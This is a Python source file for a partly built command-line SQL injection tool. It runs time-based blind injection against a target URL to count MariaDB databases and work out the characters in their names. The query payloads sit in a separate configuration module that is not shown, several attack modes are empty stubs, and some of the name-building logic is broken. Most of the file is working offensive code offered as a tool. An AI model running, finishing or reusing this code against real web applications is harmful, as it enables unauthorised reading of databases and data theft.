#!/bin/python3
import argparse
import urllib.request
import urllib.parse
import gzip
import configuration as config
import time

###### HTTP request ######

class HTTPrequest():
    """ Sends HTTP request and retrieves response. """

    def __init__(self, url, header, data=None):
        self.url = HTTPUrlEncode(url, data).encode()
        self.header = self._format_header(header)
        self.data = data
        self.request = self._create_request()

    def send_request(self):
        """ Send HTTP request and decompress response if gzip compressed. """
        with urllib.request.urlopen(self.request) as response:
            self.response = response.read()
            # Check if gzip compressed.
            if self.response[0:2] == b'\x1f\x8b':
                self.response = gzip.decompress(self.response)

            return self.response

    def _create_request(self):
        """ Create a request object  """
        return urllib.request.Request(self.url, self.data, self.header)

    def _format_header(self, header):
        """ Format list of headers input from cli and return a dict.  """
        self.header_list = header.split(", ")
        self.header_dict = dict()
        for i in range(len(self.header_list)):
            self.header_list[i] = self.header_list[i].strip()
            self.header_seperate = self.header_list[i].split(": ")
            self.header_dict[self.header_seperate[0]] = self.header_seperate[1]

        return self.header_dict



class HTTPUrlEncode():
    """ Encode url and data. """
    def __init__(self, url, data=None):
        # Named tuple of url split into parts.
        self.url = urllib.parse.urlparse(url)
        self.data = data

    def encode(self):
        """ Return an encoded url. """
        self._url_encode_path()
        self._url_encode_params()
        self._url_encode_query()
        return self.url.geturl()

    def _url_encode_path(self):
        """ Encode the path of a url.  """
        self.path = self.url.path
        self.url = self.url._replace(path=urllib.parse.quote(self.path))

    def _url_encode_params(self):
        """ Encode the parameters of a url.  """
        self.params = self.url.params
        self.url = self.url._replace(params=urllib.parse.quote(self.params))

    def _url_encode_query(self):
        """ Encode the query/queries of a url.  """
        self.query = self.url.query
        self.url = self.url._replace(query=urllib.parse.quote(self.query, safe='&='))

class HTTPTimedRequest(HTTPrequest):
    """ Timed request for time-based injection attack. """
    def __init__(self, url, header, data=None):
        super().__init__(url, header, data)
        self.time_taken = 0

    def send_request(self):
        """ return the time taken for the request """
        self.start = time.time()
        self.response = super().send_request()
        self.finish = time.time()
        self.time_taken = self.finish - self.start
        return self.time_taken


###### mariaDB ######

class MariaDBdatabase():
    """ Class that finds the number of databases and names of each database.  """
    def __init__(self, url, header, attack, data=None):
        self.database_num = 0
        self.database_names = []
        self.url = url
        self.header = header
        self.data = data
        # max num of databases to search.
        self.MAX_RANGE = 50
        self.attack = attack

    def search_database_names(self):
        """ Public method to start database count and name enumeration. """
        self._search_num_database()
        self._search_database_name()

    def get_database(self):
        """ Returns tuple of database names, with first index being number of databases. """
        return self.database

    def _search_num_database(self):
        """ Finds number of databases """
        # database query
        self.query = config.MariaDB.DATABASE_NUM.value
        self.url_injection = self.url + self.query
        if(VERBOSE): print('Searching number of databases ...')
        for i in range(0, self.MAX_RANGE + 1):
            if(self.attack == "TIME"):
                self.time = HTTPTimedRequest(self.url_injection.format(i), self.header, self.data).send_request()
                if(self.time > 5):
                    self.database_num = i
                    if(VERBOSE): print('[+] Number of databases found: {}'.format(i))
            elif(self.attack == "ERROR"):
                pass
            elif(self.attack == "BOOLEAN"):
                pass
            else:
                print('Unsupported attack type.')

    def _search_database_name(self):
        """ Iterates through known characters to find database names. """
        self.char_set = self._search_character_set()
        self.name_generator = NameGenerator(self.char_set)
        self.name_query = config.MariaDB.DATABASE_NAME.value
        self.name = self.name_generator.get_name()
        self.name_obj = MariaDBString(self.name)
        self.name_obj.create_name_query()
        self.name_as_query = self.name_obj.get_name_query()
        print(self.name_as_query)

    def _search_character_set(self):
        """ Enumerates database names for chars used. """
        self.legal_chars = config.Characters.INSENSITIVE_CHARS.value
        self.query = config.MariaDB.DATABASE_NAME_CHAR.value
        self.url_injection = self.url + self.query
        self.char_set = []
        if(VERBOSE): print('Searching possible database name characters ...')
        for char in self.legal_chars:
            if(self.attack == "TIME"):
                self.time = HTTPTimedRequest(self.url_injection.format(hex(ord(char))), self.header, self.data).send_request()
                if(self.time > 5):
                    self.char_set.append(char)
                    if(VERBOSE): print('[+] Database name character found: {}'.format(char))
            elif(self.attack == "ERROR"):
                pass
            elif(self.attack == "BOOLEAN"):
                pass
            else:
                print('Unsupported attack type.')
        if(VERBOSE): print('[+] Full database character set found: {}'.format(self.char_set))
        return self.char_set

class MariaDBtable():
    pass

class MariaDBcolumns():
    pass

class MariaDBrows():
    pass


class MariaDBString():
    """ Class that creates a string of mariaDB functions that will be concat from hex serverside. """
    def __init__(self, name):
        # Name as a character list.
        self.name = name
        self.function_string = 'CONVERT({} USING utf8), '
        self.full_name_function = ''

    def create_name_query(self):
        """ Iterate through name building query string. """
        for ch in self.name:
            if(ch != ''):
                self.function_string_hex = self.function_string.format(hex(ord(ch)))
                self.full_name_function += self.function_string_hex

    def get_name_query(self):
        return self.full_name_function


class MariaDB():
    """ Main database object for controlling enumeration of mariaDB databases. """
    def __init__(self,url,header,data=None,time=False,error=False,boolean=False):
        self.url = url
        self.header = header
        self.data = data
        self.attack = self._attack(time, error, boolean)


    def _attack(self, time, error, boolean):
        """ Define type of attack """
        if(time):
            return "TIME"
        elif(error):
            return "ERROR"
        elif(boolean):
            return "BOOLEAN"
        else:
            print("Unsupported attack type")

    def attack_database(self):
        if(VERBOSE): print('mariaDB database {} attack initiated ...'.format(self.attack))
        database_names = MariaDBdatabase(self.url,self.header,self.attack, self.data).search_database_names()


###### Name Generators ######

class NameGenerator():
    """ Class that creates a generator and returns names lazily. """
    def __init__(self, char_set):
        self.char_set = char_set # Possible characters found.
        self.MAX_NAME_SIZE = 64
        self.name = [''] * self.MAX_NAME_SIZE
        self.gen_obj = self.generator(1, self.name)

    def generator(self, n, name):
        """ Generator that recursively creates possible names. """
        for ch in self.char_set:
            name[n-1] = ch
            if(n == self.MAX_NAME_SIZE):
                yield name
            else:
                yield from self.generator(n+1, name)

    def get_name(self):
        """ Returns a name from generator lazily. """
        return next(self.gen_obj)




###### Main object builder ######
class Factory():
    """ Factory that gets classname of the main injection object. """
    def __init__(self, option):
        self.option = option

    def get_class_name(self):
        class_ = {"-mDB" : MariaDB}.get(self.option)
        return class_


###### Command line parser ######
parser = argparse.ArgumentParser()

parser.add_argument("url", help="url of target in format http://x.x.x.x:port/path")
parser.add_argument("-H", "--header", help="Header values in comma seperated list. See README for formatting. ex. Host: x.x.x.x, Accept: text/html")
parser.add_argument("-d", "--data", help="Data for HTTP POST.")
parser.add_argument("-T", "--time", help="Time based attack.", action="store_true")
parser.add_argument("-E", "--error", help="Error based attack.", action="store_true")
parser.add_argument("-B", "--boolean", help="Boolean based attack.", action="store_true")
parser.add_argument("-mDB", "--maria", help="mariaDB query.", action="store_true")
parser.add_argument("-SQL", "--mySQL", help="mySQL query.", action="store_true")
parser.add_argument("-msSQL", "--microsoft", help="microsoft SQL query.", action="store_true")
parser.add_argument("-or", "--oracle", help="oracle SQL query.", action="store_true")
parser.add_argument("-pGRE", "--postGRE", help="postGRE SQL query.", action="store_true")
parser.add_argument("-v", "--verbose", help="verbose output.", action="store_true")

###### Main function ######
def main():
    args = parser.parse_args()
    database_object = None
    if(args.maria):
        class_name = Factory("-mDB").get_class_name()

    global VERBOSE
    VERBOSE = args.verbose
    database_object = class_name(args.url, args.header, args.data, args.time, args.error, args.boolean)
    database_object.attack_database()

if __name__ == "__main__":
    main()
